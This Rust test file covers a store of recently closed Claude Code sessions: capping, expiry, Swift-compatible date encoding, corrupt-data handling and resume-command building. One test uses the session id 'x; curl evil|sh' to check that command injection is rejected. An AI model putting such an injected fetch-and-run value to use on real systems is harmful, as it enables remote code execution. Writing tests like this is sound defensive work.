use claude_sessions_core::closed_sessions::{ClosedSession, ClosedSessions, ClosedStore};
use claude_sessions_core::kv::{KeyValueStore, MemoryStore};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

/// Seconds between 1970-01-01 and Swift's reference date 2001-01-01.
const REFERENCE_OFFSET: f64 = 978_307_200.0;

const FIXTURE: &[u8] = include_bytes!("../fixtures/closed-sessions-swift.json");

fn closed(id: &str, at: SystemTime) -> ClosedSession {
    ClosedSession {
        id: id.into(),
        title: format!("t {id}"),
        cwd: "/tmp/x".into(),
        branch: Some("main".into()),
        closed_at: at,
    }
}

fn ids(c: &ClosedSessions) -> Vec<&str> {
    c.items().iter().map(|s| s.id.as_str()).collect()
}

const UUID: &str = "0b6f3a2e-6c1d-4d3e-9a5b-1f2e3d4c5b6a";

#[test]
fn add_caps_at_five() {
    let now = SystemTime::now();
    let mut c = ClosedSessions::default();
    for i in 0..7 {
        c.add(closed(&format!("s{i}"), now), now);
    }
    assert_eq!(c.items().len(), 5);
    assert_eq!(ids(&c), ["s6", "s5", "s4", "s3", "s2"]);
}

#[test]
fn drops_after_24h() {
    let now = SystemTime::now();
    let hours = |h: u64| Duration::from_secs(h * 3600);
    let mut c = ClosedSessions::default();
    c.add(closed("old", now - hours(23)), now);
    c.add(closed("new", now), now);
    assert_eq!(ids(&c), ["new", "old"]);
    c.prune(now + hours(2));
    assert_eq!(ids(&c), ["new"]);
    c.add(closed("stale", now - hours(25)), now);
    assert_eq!(ids(&c), ["new"]);
}

#[test]
fn no_duplicate_ids() {
    let now = SystemTime::now();
    let later = now + Duration::from_secs(5);
    let mut c = ClosedSessions::default();
    c.add(closed("a", now), now);
    c.add(closed("b", now), now);
    c.add(closed("a", later), later);
    assert_eq!(ids(&c), ["a", "b"]);
}

#[test]
fn revived_is_removed() {
    let now = SystemTime::now();
    let mut c = ClosedSessions::default();
    for id in ["a", "b", "c"] {
        c.add(closed(id, now), now);
    }
    c.revive(&["a", "c", "zzz"].iter().map(|s| s.to_string()).collect());
    assert_eq!(ids(&c), ["b"]);
}

#[test]
fn codable_round_trip() {
    // Whole seconds survive the round trip through a Double exactly, as Swift's `Date` does.
    let now = UNIX_EPOCH
        + Duration::from_secs(
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        );
    let a = ClosedSession {
        id: "a".into(),
        title: "Tiêu đề".into(),
        cwd: "/tmp/it's".into(),
        branch: None,
        closed_at: now,
    };
    let b = closed("b", now - Duration::from_secs(60));
    let store = ClosedStore::new(Box::new(MemoryStore::default()));
    let mut c = ClosedSessions::default();
    c.add(b.clone(), now);
    c.add(a.clone(), now);
    store.save(&c);
    assert_eq!(store.load(now).items(), [a, b]);
}

#[test]
fn decodes_swift_encoded_closed_sessions() {
    let kv = MemoryStore::default();
    kv.set_bytes("closedSessions", FIXTURE);
    let store = ClosedStore::new(Box::new(kv.clone()));
    // The fixture dates are seconds since 2001-01-01: load at a moment right after them.
    let fixture: serde_json::Value = serde_json::from_slice(FIXTURE).unwrap();
    let first = &fixture[0];
    let unix = first["closedAt"].as_f64().unwrap() + REFERENCE_OFFSET;
    let now = UNIX_EPOCH + Duration::from_secs_f64(unix);
    let items = store.load(now).items().to_vec();
    assert_eq!(items.len(), 2);
    assert_eq!(items[0].id, first["id"].as_str().unwrap());
    assert_eq!(items[0].cwd, "/tmp/project-a");
    assert_eq!(items[0].closed_at, now);
    assert_eq!(items[1].cwd, "/tmp/project-b");
    assert_eq!(items[1].branch, None);
}

#[test]
fn encodes_dates_since_2001() {
    let kv = MemoryStore::default();
    let now = SystemTime::now();
    let store = ClosedStore::new(Box::new(kv.clone()));
    let mut c = ClosedSessions::default();
    c.add(closed("a", now), now);
    store.save(&c);
    let bytes = kv.get_bytes("closedSessions").unwrap();
    let v: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
    let encoded = v[0]["closedAt"].as_f64().expect("closedAt is a number");
    let unix_now = now.duration_since(UNIX_EPOCH).unwrap().as_secs_f64();
    assert!(encoded < unix_now - REFERENCE_OFFSET + 1.0);
    assert!((encoded + REFERENCE_OFFSET - unix_now).abs() < 0.001);
}

#[test]
fn resume_rejects_non_uuid_id() {
    let bad = ClosedSession {
        id: "x; curl evil|sh".into(),
        ..closed("x", SystemTime::now())
    };
    assert_eq!(bad.resume_command(), None);
    assert_eq!(bad.shell_command(), None);
    let good = ClosedSession {
        id: UUID.into(),
        cwd: "/tmp/it's".into(),
        ..closed("x", SystemTime::now())
    };
    assert_eq!(
        good.resume_command().as_deref(),
        Some(format!("claude --resume '{UUID}' --permission-mode bypassPermissions").as_str())
    );
    assert_eq!(
        good.shell_command().as_deref(),
        Some(
            format!(
                "cd '/tmp/it'\\''s' && claude --resume '{UUID}' --permission-mode bypassPermissions"
            )
            .as_str()
        )
    );
}

#[test]
fn out_of_range_closed_at_loads_as_empty_without_panic() {
    for bad in ["1e300", "-1e300"] {
        let kv = MemoryStore::default();
        let json = format!(r#"[{{"id":"a","title":"t","cwd":"/x","closedAt":{bad}}}]"#);
        kv.set_bytes("closedSessions", json.as_bytes());
        let store = ClosedStore::new(Box::new(kv));
        assert!(store.load(SystemTime::now()).items().is_empty());
    }
}

#[test]
fn one_bad_item_is_dropped_and_the_good_ones_stay() {
    let kv = MemoryStore::default();
    let now = SystemTime::now();
    let at = now.duration_since(UNIX_EPOCH).unwrap().as_secs_f64() - REFERENCE_OFFSET;
    let list = serde_json::json!([
        {"id": "good1", "title": "t", "cwd": "/tmp/a", "closedAt": at},
        {"id": "bad", "title": "t", "cwd": "/tmp/b", "closedAt": 1e300},
        {"id": "good2", "title": "t", "cwd": "/tmp/c", "closedAt": at},
    ]);
    kv.set_bytes("closedSessions", &serde_json::to_vec(&list).unwrap());
    let store = ClosedStore::new(Box::new(kv));
    assert_eq!(ids(&store.load(now)), ["good1", "good2"]);
}
